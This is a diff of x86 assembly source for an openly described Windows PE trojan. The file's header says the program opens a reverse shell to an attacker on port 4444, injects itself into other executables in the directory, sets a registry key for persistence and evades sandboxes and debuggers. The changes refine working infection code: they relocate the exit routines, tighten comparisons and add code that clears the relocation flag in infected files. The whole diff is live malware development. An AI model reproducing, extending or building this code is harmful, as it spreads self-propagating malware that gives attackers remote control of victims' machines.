@@ -1,13 +1,13 @@
 ;--------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 184)
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 202)
 ; Version: 2.5
 ; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
 ; It can also add itself to the registry key and alters its behaviour when it detects sandboxes and debuggers
 ; The injected file can also infect other files in the directory while avoiding inject to the infected files.
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1235 bytes
+; Size: 1233 bytes
 ;--------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -33,13 +33,13 @@ get_eip:
 	Std
 	Rep Stosd
 	Cld
-	Call check
+	Jmp check
 
 hash_api:
 	Pushad						; save all registers
 	Mov Ebp, Esp
-	Xor Edx, Edx
-	Mov Edx, [Fs:30H]				; PEB
+	Xor Esi, Esi
+	Mov Edx, [Fs:30H + Esi]				; PEB
 	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
 	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
 
@@ -129,6 +129,24 @@ get_next_module:
 	Pop Edx						; Restore the current position in the module list
 	Mov Edx, [Edx]					; Go to the next module
 	Jmp next_module
+
+exit:
+	Push Ebx					; 0
+	Push 56A2B5F0H					; hash("kernel32.dll", "ExitProcess")
+	Call hash_api
+
+exit_success:
+	Xor Esi, Esi
+	Mov Edx, [Fs:30H + Esi]				; PEB
+	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
+	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
+	Mov Edi, [Edx + 10H]				; Base address of the current executable
+
+	Mov Eax, [Edi + 34H]				; Load jump back entry point to eax
+	Test Eax, Eax					; If nothing is written there => exit
+	Je exit
+	Push Eax
+	Ret
 
 check:
 	Lea Eax, [Ebp - 250H]
@@ -242,8 +260,8 @@ SetRegistryKey:
 	Push 0726774CH 					; hash("kernel32.dll", "LoadLibraryA")
 	Call hash_api
 
-	Mov Dx, 6EH
-	Push Edx
+	Mov Cl, 6EH
+	Push Ecx
 	Push 75525C6EH
 	Push 6F697372H
 	Push 6556746EH
@@ -379,7 +397,7 @@ infect_next_file:
 	Call hash_api
 
 	; Check if there are more files to process
-	Cmp Eax, 0
+	Test Eax, Eax
 	Jne process_files_loop
 
 	; No more file, jump to success
@@ -458,7 +476,7 @@ InjectingFile:
 	Mov [Ebp - 58H], Eax				; Save the base address
 
 	Mov Eax, [Eax + 34H]
-	Cmp Eax, 0					; Checking if the file has been infected or not
+	Test Eax, Eax					; Checking if the file has been infected or not
 	Jnz infect_next_file				; If it's infected, move to next file
 
 	Mov Edi, [Ebx + 3CH]
@@ -547,6 +565,14 @@ InjectingFile:
 	Mov Eax, [Ebp - 60H]				; eax = SizeOfImage
 	Add Ecx, Eax
 	Mov [Edi + 50H], Ecx				; Update new SizeOfImage
+
+	; Turn off DLL can move flag
+	Mov Eax, [Edi + 5EH]
+	Xor Ecx, Ecx
+	Mov Cl, 40H					; IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
+	Not Ecx
+	And Eax, Ecx					; Clear the flag
+	Mov [Edi + 5EH], Eax
 	Pop Edi						; Restore the current position in the section table
 
 	; Injecting the payload
@@ -586,23 +612,6 @@ InjectingFile:
 	Push 0D7E3CBDBH					; hash("kernel32.dll", SetEndOfFile")
 	Call hash_api					; Call SetEndOfFile
 	Jmp infect_next_file
-
-exit:
-	Push Ebx					; 0
-	Push 56A2B5F0H					; hash("kernel32.dll", "ExitProcess")
-	Call hash_api
-
-exit_success:
-	Mov Edx, [Fs:30H]				; PEB
-	Mov Edx, [Edx + 0CH]				; PEB_LDR_DATA
-	Mov Edx, [Edx + 14H]				; First module in InMemoryOrderModuleList
-	Mov Edi, [Edx + 10H]				; Base address of the current executable
-
-	Mov Eax, [Edi + 34H]				; Load jump back entry point to eax
-	Cmp Eax, 0					; If nothing is written there => exit
-	Je exit
-	Push Eax
-	Ret
 
 PayloadSize = $ -payload
 
